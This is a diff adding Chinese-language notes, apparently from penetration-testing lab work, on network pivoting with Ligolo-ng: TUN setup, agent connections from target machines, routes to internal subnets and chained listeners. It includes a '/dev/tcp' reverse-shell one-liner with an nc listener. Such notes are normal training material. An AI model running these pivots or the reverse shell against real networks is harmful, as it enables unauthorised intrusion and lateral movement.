@@ -1,0 +1,184 @@
+
+kali作为代理服务器使用：
+
+1. 设置TUN接口
+
+sudo ip tuntap add user kali mode tun ligolo
+
+sudo ip link set ligolo up
+
+
+2. 查看刚才创建的网络接口
+
+ip a
+
+3. 启动代理服务器
+
+sudo ./proxy -selfcert
+
+# 该参数是作为自身证书的使用，如果使用运⾏ ./proxy -autocert 将使⽤ Let's Encrypt ⽣成合法证书这个需要结合域名使用。
+
+
+4. 在靶机上运行客户端去连接代理服务器
+
+./agent -connect 10.10.15.146:11601 -ignore-cert
+
+
+5. 在代理服务器上获取到靶机的反向连接后，需要在代理服务器上面设置新路由进行访问靶机C段的资产
+
+
+session  # 选择靶机1号的 session 选项
+
+ifconfig # 查看靶机1号的路由情况
+
+6. 根据查看的靶机路由情况，在代理服务器上面添加实际的路由地址
+
+
+sudo ip route add 172.16.8.0/24 dev ligolo
+
+7. 至此，就可以在代理服务上面查看靶机C段的所有资产了
+
+start # 启动路由隧道
+
+
+---------------------------------------------------------------
+
+
+双网段隧道建立~
+
+1. 当获取第一个靶机隧道后，我们需要先创建一个监听器，并查看下监听器列表
+
+session # 选择靶机1号的 session 选项
+
+tunnel_start # 启动隧道1号
+
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+
+listener_list
+
+# addr 地址表示 AGENT 的地址，也就是靶机的地址
+# to 地址表示 PROXY 的地址，也就是代理服务器的地址
+# 在初始枢轴上将新主机的流量发送到代理服务器，以便其能够建⽴隧道。
+
+2. 设置完后，在靶机2号上运行我们的客户端程序，并去连接靶机1号上面的监听地址
+
+./agent.exe -connect 172.16.8.120:11601 -ignore-cert
+
+3. 我们在代理服务器上面就会收到来自靶机2号的网段了
+
+session # 选择靶机2号的 session 选项
+
+ifconfig # 查看靶机2号的路由情况
+
+4. 继续在代理服务器上面添加靶机2号的路由网段
+
+sudo ip route add 172.16.9.0/24 dev ligolo
+
+ip route
+
+5. 至此，就可以在代理服务上面查看靶机2号C段的所有资产了
+
+
+
+---------------------------------------------------------------
+
+
+上述单隧道，双隧道的建立，都是基于正向访问的内网资源的情况，下面讲述如何基于双隧道建立反弹shell的监听
+
+使⽤Ligolo，我们可以在 靶机2号 上创建⼀个侦听器，通过现有隧道将流量直接转发到我们的 Kali 代理服务上面，⽽不必从 靶机3号 → 靶机2号 → 靶机1号 → Kali 转发端⼝！
+
+1. 创建监听器
+
+session # 进入到靶机2号的 session 选项里
+
+listener_add --addr 0.0.0.0:9001 --to 127.0.0.1:9001 --tcp
+
+listener_list
+
+# 侦听器 #1 现在会将到达 DC01:9001 的所有流量转发到 PROXYSERVER:9001。（如有需要，您也可以将其转发给其他主机）
+
+
+2. kali 代理服务器上面运行nc监听
+
+nc -lvnp 9001
+
+3. 在靶机3号上面运行反弹shell
+
+sh -i >& /dev/tcp/172.16.9.3/9001 0>&1
+
+# 这里的地址是靶机2号的地址
+
+4. 成功获取到监听shell
+
+
+---------------------------------------------------------
+
+TUN网络接口的创建与删除
+
+
+Linux:
+
+# 使用Linux时，需要在代理服务器（C2）上创建tun接口：
+
+$ sudo ip tuntap add user [your_username] mode tun ligolo
+$ sudo ip link set ligolo up
+
+
+# 关闭并删除ligolo接口
+sudo ip link set ligolo down
+sudo ip tuntap del mode tun ligolo
+
+
+Windows:
+
+您需要下载Wintun驱动程序（由WireGuard使用）并将其放置wintun.dll在与 Ligolo 相同的文件夹中（确保您使用正确的架构）。
+
+https://www.wireguard.com/
+
+https://www.wireguard.com/install/
+
+Windows [7、8.1、10、11、2008R2、2012R2、2016、2019、2022– v 0.5.3]
+
+
+------------------------------------------------
+
+网络路由的添加与删除
+
+
+# 添加路由至Ligolo接口
+
+sudo ip route add 172.16.9.0/24 dev ligolo
+
+# 删除Ligolo接口上设定的路由
+
+sudo ip route del 172.16.9.0/24 dev ligolo
+
+
+------------------------------------------------------
+
+访问代理的本地端口（127.0.0.1）
+
+如果您需要访问当前连接的代理的本地端口，Ligolo-ng 中有一个硬编码的“神奇”IP：240.0.0.1（此 IP 地址是未使用的 IPv4 子网的一部分）。如果您查询此 IP 地址，Ligolo-ng 会自动将流量重定向到代理的本地 IP 地址 (127.0.0.1)。
+
+$ sudo ip route add 240.0.0.1/32 dev ligolo
+$ nmap 240.0.0.1 -sV
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
